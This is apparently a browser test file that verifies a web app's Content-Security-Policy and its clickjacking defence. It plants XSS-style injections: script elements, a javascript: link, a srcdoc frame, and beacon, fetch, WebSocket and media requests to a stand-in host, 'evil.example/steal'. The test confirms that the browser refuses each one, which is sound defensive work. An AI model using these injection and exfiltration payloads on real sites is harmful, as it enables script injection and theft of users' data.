"""The page's security policy as the browser enforces it: a second wall behind the escaping.

The policy is the first thing in the page, lists the SHA-256 of exactly this build's inline scripts, and the app runs under it
with no violation. Planted on purpose (as if escaping had failed): a <script> element, a javascript: link, a request and an
image beacon to an outside host, a form post, a frame and a <base> change. The browser must refuse every one. The page hides
itself when another site frames it. Nothing here contacts the outside: refused requests never leave the browser.
"""
import os as _os, sys as _sys
_sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
import _paths
import asyncio, sys, re, hashlib, base64, pathlib
from playwright.async_api import async_playwright
import fontroute
BASE = _paths.BASE
ORIGIN = _paths.ORIGIN
ROOT = pathlib.Path(__file__).resolve().parents[2]
results = []
def check(name, ok, info=''):
    results.append((ok, name, info)); print(('PASS ' if ok else 'FAIL ') + name + ('' if ok else f'  -> {str(info)[:500]}'))

async def main():
    html = (ROOT / 'index.html').read_text(encoding='utf-8')
    head = html[:html.index('</head>')]
    m = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)"', head)
    check('the page has a security policy', bool(m))
    csp = m.group(1) if m else ''
    first = re.search(r'<head>\s*<meta charset="UTF-8" />\s*<meta http-equiv="Content-Security-Policy"', html)
    check('it comes first in the head, before any link, style or script', bool(first), head[:300])
    d = {x.strip().split(' ')[0]: x.strip().split(' ')[1:] for x in csp.split(';') if x.strip()}
    blocks = re.findall(r'<script>(.*?)</script>', html, flags=re.S)
    want = sorted("'sha256-" + base64.b64encode(hashlib.sha256(b.encode('utf-8')).digest()).decode() + "'" for b in blocks)
    check('script blocks: only the SHA-256 of this build\'s own inline scripts', sorted(d.get('script-src-elem', [])) == want and len(want) >= 2, [d.get('script-src-elem'), want])
    check('no script block carries attributes (a src= script would be outside the list)', not re.search(r'<script\s+[^>]', html))
    check("no 'unsafe-inline', 'unsafe-eval' or wildcard for script blocks", not any(x in ' '.join(d.get('script-src-elem', [])) for x in ["'unsafe-inline'", "'unsafe-eval'", '*', 'http:', 'https:', 'data:']))
    check("nothing may run text as code ('unsafe-eval' nowhere)", "'unsafe-eval'" not in csp and "'wasm-unsafe-eval'" not in csp)
    check('default-src none, frames none, objects none, base none, forms none', d.get('default-src') == ["'none'"] and d.get('frame-src') == ["'none'"] and d.get('object-src') == ["'none'"] and d.get('base-uri') == ["'none'"] and d.get('form-action') == ["'none'"])
    check('connections: the site, GitHub (Studio) and the five AI providers, nothing else', d.get('connect-src') == ["'self'", 'https://api.github.com', 'https://api.anthropic.com', 'https://api.openai.com', 'https://generativelanguage.googleapis.com', 'https://api.groq.com', 'https://openrouter.ai'], d.get('connect-src'))
    check('video and captions: the site only', set(d.get('media-src', [])) == {"'self'", 'file:'}, d.get('media-src'))
    check('images and fonts: the site only (plus data: and blob: made in the page)', set(d.get('img-src', [])) <= {"'self'", 'data:', 'blob:', 'file:'} and set(d.get('font-src', [])) <= {"'self'", 'data:', 'file:'})
    check('a no-referrer policy', '<meta name="referrer" content="no-referrer" />' in head)

    async with async_playwright() as p:
        b = await p.chromium.launch()
        ctx = await b.new_context(viewport={'width': 1360, 'height': 900})
        await ctx.add_init_script("window.__hits = []; window.__x = t => window.__hits.push(String(t));")
        pg = await ctx.new_page()
        errs, viol, outside = [], [], []
        pg.on('pageerror', lambda e: errs.append(str(e)))
        pg.on('console', lambda m: viol.append(m.text) if 'Content Security Policy' in m.text or 'Content-Security-Policy' in m.text else None)
        await fontroute.install(pg)
        async def arrived(route):   # only a request the browser actually lets out reaches this handler; a refused one never does
            outside.append(route.request.url); await route.fulfill(status=200, body='')
        await pg.route('https://evil.example/**', arrived)
        await pg.route('wss://evil.example/**', arrived)
        await pg.goto(BASE); await pg.wait_for_selector('#sidebar', state='attached'); await pg.wait_for_timeout(500)
        await pg.evaluate("() => document.addEventListener('securitypolicyviolation', e => (window.__viol = window.__viol || []).push(e.effectiveDirective + ' ' + (e.blockedURI || '')))")
        # the app works under the policy: buttons (inline handlers), the worker, a whole report
        await pg.evaluate("async () => { loadHalcyon(); const m = $id('memo-toggle'); if (m) m.checked = false; await runAnalysis(); }")
        await pg.wait_for_function("() => S.result && S.result.proj && document.querySelector('#rp-overview')", timeout=20000)
        try:
            await pg.wait_for_function("() => S.result.proj.sim && S.result.proj.sim.pDeath != null", timeout=15000); sim = True
        except Exception:
            sim = False
        await pg.evaluate("() => { const b = $id('rt-findings'); if (b) b.click(); }")
        tab_ok = await pg.evaluate("() => !!document.querySelector('#rp-findings.active')")
        check('the app runs under the policy: report, an inline click handler, the simulation worker', tab_ok and sim, [tab_ok, sim])
        check('and the browser reported no policy violation while it ran', not viol and not await pg.evaluate("() => window.__viol || []"), [viol, await pg.evaluate("() => window.__viol || []")])

        # now plant what an injection would plant
        await pg.evaluate("""() => {
          const host = document.createElement('div'); host.id = 'planted'; document.body.appendChild(host);
          host.appendChild(document.createRange().createContextualFragment("<script>__x('script-element')<\\/script>"));
          const s = document.createElement('script'); s.textContent = "__x('script-created')"; host.appendChild(s);
          const s2 = document.createElement('script'); s2.src = 'https://evil.example/x.js'; host.appendChild(s2);
          const a = document.createElement('a'); a.href = "javascript:__x('js-link')"; a.id = 'planted-link'; a.textContent = 'x'; host.appendChild(a);
          const i = document.createElement('img'); i.src = 'https://evil.example/beacon.gif?d=1'; host.appendChild(i);
          const f = document.createElement('iframe'); f.src = 'https://evil.example/'; host.appendChild(f);
          const f2 = document.createElement('iframe'); f2.srcdoc = "<script>parent.__x('srcdoc')<\\/script>"; host.appendChild(f2);
          const o = document.createElement('object'); o.data = 'https://evil.example/x.swf'; host.appendChild(o);
          const vd = document.createElement('video'); vd.src = 'https://evil.example/x.mp4'; vd.preload = 'auto'; host.appendChild(vd);
          const au = document.createElement('audio'); au.src = 'https://evil.example/x.mp3'; au.preload = 'auto'; host.appendChild(au);
          window.__fetch = fetch('https://evil.example/steal', { method:'POST', body:'x' }).then(() => 'sent', e => 'blocked');
          try { new WebSocket('wss://evil.example/'); window.__ws = 'opened'; } catch (e) { window.__ws = 'blocked'; }
          try { navigator.sendBeacon('https://evil.example/b', 'x'); } catch (e) {}
        }""")
        await pg.evaluate("() => document.getElementById('planted-link').click()")
        await pg.wait_for_timeout(800)
        hits = await pg.evaluate("() => window.__hits.slice()")
        check('a planted <script> element does not run (parsed or created)', not any(h.startswith('script') for h in hits), hits)
        check('a planted javascript: link does not run', 'js-link' not in hits, hits)
        check('a planted frame does not run or load', 'srcdoc' not in hits, hits)
        check('a request to an outside host is refused', await pg.evaluate("() => window.__fetch") == 'blocked')
        check('nothing reached an outside host (script, image beacon, frame, object, video, audio, socket, beacon)', not outside, outside)
        v = await pg.evaluate("() => (window.__viol || []).map(x => x.split(' ')[0])")
        check('the browser reported each refusal as a policy violation (media included)', {'script-src-elem', 'img-src', 'frame-src', 'connect-src', 'media-src'} <= set(v), sorted(set(v)))
        check('no page errors', not errs, errs)
        await ctx.close()

        # framed by another site: the page hides itself
        ctx = await b.new_context()
        pg = await ctx.new_page()
        other = ORIGIN + '/__framer.html'   # the page hides itself in any frame; a framer on this address avoids Chrome's local-network block on test servers
        await pg.route(other, lambda r: r.fulfill(status=200, content_type='text/html', body=f'<iframe id="f" src="{BASE}" width="800" height="600"></iframe>'))
        await pg.goto(other); await pg.wait_for_timeout(1500)
        disp = await pg.frames[1].evaluate("() => getComputedStyle(document.documentElement).display") if len(pg.frames) > 1 else 'no frame'
        check('framed by another site, the page hides itself (clickjacking)', disp == 'none', disp)
        await ctx.close(); await b.close()
    bad = [r for r in results if not r[0]]
    print(f'\n{len(results) - len(bad)}/{len(results)} passed')
    sys.exit(1 if bad else 0)

asyncio.run(main())
